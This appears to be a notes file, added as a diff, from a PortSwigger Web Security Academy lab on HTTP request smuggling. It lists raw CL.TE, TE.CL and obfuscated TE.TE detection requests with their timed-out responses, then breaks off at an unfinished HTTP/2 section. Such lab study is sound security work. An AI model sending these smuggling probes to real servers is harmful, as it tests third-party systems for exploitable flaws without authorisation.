@@ -1,0 +1,64 @@
+Detection payloads work without specifying the Content-Type also.
+HTTP1:
+CL.TE:
+
+Request:
+POST / HTTP/1.1
+Host: 0ab3000903f163ee801eb25d00e0007e.web-security-academy.net
+Transfer-Encoding: chunked
+Content-Length: 4
+
+1
+A
+X
+
+
+Response:
+Timed out
+
+
+TE.CL:
+Request:
+POST / HTTP/1.1
+Host: 0ab3000903f163ee801eb25d00e0007e.web-security-academy.net
+Transfer-Encoding: chunked
+Content-Length: 6
+
+0
+
+X
+
+Response:
+Timed out
+
+
+
+TE.TE:   TE obfuscated
+Request:
+
+POST / HTTP/1.1
+Host: 0a1d00cb0367551f829b384d000700e2.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Transfer-Encoding: chunked
+Transfer-Encoding: cow
+Content-Length: 6
+
+0
+
+X
+
+
+Response:
+Timed out
+
+
+
+
+HTTP/2:
+POST / HTTP/2
+Host: 0af000640327218788752b3500a9001e.web-security-academy.net
+Content-Length: 10
+
+Detection when CL and TE are both filtered out:
+	
+
